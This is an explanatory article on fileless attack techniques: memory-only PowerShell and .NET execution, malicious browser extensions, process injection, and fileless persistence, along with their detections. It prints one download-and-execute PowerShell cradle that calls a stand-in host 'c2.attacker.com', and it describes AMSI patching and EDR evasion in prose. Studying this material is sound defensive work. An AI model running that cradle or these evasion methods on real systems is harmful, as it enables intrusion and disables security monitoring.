# Fileless and ephemeral attacks

Writing a file to disk creates an artefact: a hash to match, a timestamp to examine, a path to investigate. Modern attacks avoid this wherever possible. Fileless execution keeps the payload in memory, in registry values, in WMI subscriptions, or inside the legitimate processes that run it. When the process exits or the machine reboots, the artefact disappears. Detection pipelines that depend on file system monitoring find nothing to alert on.

## Memory-only execution

PowerShell's `IEX` (Invoke-Expression) combined with a download cradle executes code that was never written to disk. The script is downloaded into a string variable and executed directly in the PowerShell process's memory:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://c2.attacker.com/payload.ps1')
```

Script block logging and AMSI (Antimalware Scan Interface) have made raw PowerShell cradles detectable by most EDR platforms. Current practice wraps the payload in AMSI bypass techniques before execution: patching the `AmsiScanBuffer` function in memory to return a clean result before the payload is passed to the scanner.

.NET assemblies loaded entirely in memory via `[System.Reflection.Assembly]::Load()` provide a more capable execution environment than PowerShell scripts and interact with AMSI differently. Tools such as Cobalt Strike's execute-assembly, Seatbelt, and SharpHound are commonly used this way.

## In-browser execution

The browser's JavaScript engine is a capable execution environment that runs in a trusted process, has network access, and generates no disk artefacts. Malicious JavaScript delivered through a compromised web page, a phishing link, or a malicious browser extension executes entirely within the browser's sandbox. The limitation is that browser sandbox escapes are required to reach the OS layer; without an escape, the attacker is confined to what the browser's origin model permits.

Browser extensions, however, run outside the content sandbox. A malicious extension installed by the user (through social engineering, a compromised extension store listing, or a pre-installed extension on a managed device) has access to all tab content, can modify HTTP requests and responses, can read cookies and session storage, and can exfiltrate data to external destinations. Many organisations do not audit extension installations and do not block unknown extensions through policy.

## Short-lived processes and rapid cleanup

Ephemeral attack patterns minimise the window during which suspicious process activity is visible. A loader process spawns, injects into a legitimate process, and exits. The injected code runs in the legitimate process's context. From that point forward, the visible footprint is a legitimate process with slightly unusual memory regions that only advanced memory scanning would detect.

Process lifetime monitoring by EDR correlates parent-child relationships and flags short-lived processes that perform suspicious operations. Bypassing this requires either injecting into long-lived processes (so the activity blends into an existing process's timeline) or mimicking the duration patterns of legitimate short-lived processes such as Windows update agents and scheduled task binaries.

## Persistence without files

When persistence is needed, the options that avoid dropping files include: WMI event subscriptions (trigger on system events, execute commands, all stored in the WMI repository); registry run keys pointing to LOLBins with command-line arguments; COM hijacking (replacing a COM object registration so that when a legitimate application loads the COM object, the attacker's code runs instead); and scheduled tasks created through the Task Scheduler COM interface rather than by writing XML files.

Each of these persistence mechanisms has corresponding detection: WMI subscriptions are logged in the WMI repository and in Sysmon event 19-21; registry run keys appear in standard registry auditing; COM hijacking leaves traces in the registry. The attacker's advantage is that defenders must monitor all of these simultaneously, while the attacker needs only one to be overlooked.
